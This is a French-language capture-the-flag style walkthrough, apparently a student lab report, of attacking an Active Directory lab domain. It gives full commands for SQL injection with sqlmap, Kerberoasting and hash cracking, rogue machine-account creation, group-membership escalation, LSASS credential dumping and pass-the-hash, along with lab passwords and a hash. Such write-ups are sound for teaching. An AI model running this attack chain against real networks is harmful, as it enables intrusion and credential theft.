Tout d'abord pour demader le vpn 
sudo openvpn --config akil.ovpn
sudo route -n add -net 192.168.40.0/24 -interface utun3


Ensuite voici a quoi ressemble mon /etc/hosts
![Capture d’écran 2024-11-14 à 16 00 35](https://github.com/user-attachments/assets/09392315-4757-494f-98ab-cc74ef0e38c4)

Ensuite, en faisant un sqlmap, on trouve:
sqlmap -u "http://internal.vuln.lab/index.php?page=profil.php&id=5" --cookie="PHPSESSID=231iferbmflpia398nc649doua" --schema --batch
![Capture d’écran 2024-11-14 à 16 03 56](https://github.com/user-attachments/assets/35b4f2ff-e3df-47bf-9a11-eeb170d514d1)

sqlmap -u "http://internal.vuln.lab/index.php?page=profil.php&id=5" --cookie="PHPSESSID=231iferbmflpia398nc649doua" --dump -T users --batch
![Capture d’écran 2024-11-14 à 16 04 11](https://github.com/user-attachments/assets/69f89746-4eb2-400b-9b2c-95bbfe82187d)

Ici, il a reussi a trouver le mot de passe d'alice seulement (p@ssword)

ensuite on fait un kerberoasting:
nxc ldap 192.168.40.127 -u 'Alice.mice' -p 'p@ssword' -d 'vuln.lab' --kerberoasting kerberoasting.txt
![Capture d’écran 2024-11-14 à 16 05 41](https://github.com/user-attachments/assets/18a9f071-ea3f-4912-8ce9-0898fb7fd9ff)
on peut voir que ce hash correspond au svc_src.

et grace au haschat on a:
hashcat -m 13100 -a 0 kerberoasting.txt passwords.txt 
![Capture d’écran 2024-11-14 à 16 06 30](https://github.com/user-attachments/assets/78dff516-e728-4e94-b740-ad684e7d4bea)

On peut aussi le faire avec John The Ripper:
john --format=krb5tgs --wordlist=passwords.txt kerberoasting.txt
![Capture d’écran 2024-11-14 à 16 07 07](https://github.com/user-attachments/assets/5c67de6d-ce53-4c7e-8c75-ed773514a771)

le mot de passe de svc_srv est finalement qwerty123

On observe ensuite les droit d'avec d'Alice:
nxc smb DC01.VULN.LAB -u 'Alice.mice' -p 'p@ssword' -d 'vuln.lab' --dns-server 192.168.40.127 --shares
![Capture d’écran 2024-11-14 à 16 07 49](https://github.com/user-attachments/assets/f41a0246-073b-4d76-9d7f-fdb8e5f12b27)
Malheureusement ce qui nous interrese c'est le CurriculumVitae et alice n'a pas acces.
Grace a alice, on va crée un user qu'on a appeller akil:
bloodyAD -u Alice.mice -p 'p@ssword' -d vuln.lab --host vuln.lab --dc-ip 192.168.40.127 add computer akil 'Password!'
![Capture d’écran 2024-11-14 à 16 22 31](https://github.com/user-attachments/assets/0449e44f-cec3-4329-9dae-79f16989f45a)

Pour se connecter au BloodHound:

bloodhound-python -c All -u 'Alice.mice' -p 'p@ssword' -d vuln.lab -ns 192.168.40.127
curl -L https://ghst.ly/getbhce | sudo docker compose -f - up

et ensuite se connecter via ce lien:
http://127.0.0.1:8080/ui/explore
et upload les fichiers .json dans l'onglet Administration 



Ensuite grace au svc_srv on ajoute le compte créé au groupe serveur admin:
bloodyAD -u svc_srv -p 'qwerty123' -d vuln.lab --host 192.168.40.127 --dc-ip 192.168.40.127 add groupMember server_admins 'akil$'
![Capture d’écran 2024-11-14 à 16 18 53](https://github.com/user-attachments/assets/130f4146-5860-4b89-9b8d-fee75317247d)

on a bien acces au information d'un compte admin:
![Capture d’écran 2024-11-14 à 16 25 48](https://github.com/user-attachments/assets/ddbc54c1-8d21-472d-b924-f6a1cbb659f9)

Ensuite grace a cette commande on a pu avoir acces au mot de passe hasher de srv_neccus en utilisant lsassy:
 nxc smb SRV01.VULN.LAB -u 'akil$' -p 'Password!' -M lsassy
 ![Capture d’écran 2024-11-14 à 16 29 17](https://github.com/user-attachments/assets/387278f6-bb8d-4cc5-af39-159c391a525f)

 une fois qu'on a le hash, onpeut ajouter l'ordi akil au humain ressourse car dans bloodhound on peut voire que svc_neccus est membre de administrative_groups et que celui ci peut ajouter des personnes dans human_resources.
 <img width="1433" alt="Capture d’écran 2024-11-14 à 16 32 51" src="https://github.com/user-attachments/assets/5a76fe09-2541-4a3d-8312-3191dc30c77a">
  bloodyAD -u svc_nessus -p ':e3cddc751fabf3eed53f904d85b1a0ba' -d vuln.lab --host 192.168.40.127 --dc-ip 192.168.40.127 add groupMember "human_resources" 'akil$'
  ![Capture d’écran 2024-11-14 à 16 33 32](https://github.com/user-attachments/assets/f639e056-1639-497d-9524-839bd37389b3)

  et donc au final en utilisant cette commande, on a acces au CurriculumVitae:
  nxc smb DC01.VULN.LAB -u 'akil$' -p 'Password!' -d 'vuln.lab' --dns-server 192.168.40.127 --shares 
![Capture d’écran 2024-11-14 à 16 35 17](https://github.com/user-attachments/assets/3956ac70-d6a7-4178-8676-13dca51c6e89)
![Capture d’écran 2024-11-14 à 16 35 53](https://github.com/user-attachments/assets/ecca4a57-8a0c-43f9-beb8-e13a60674b57)


 

 









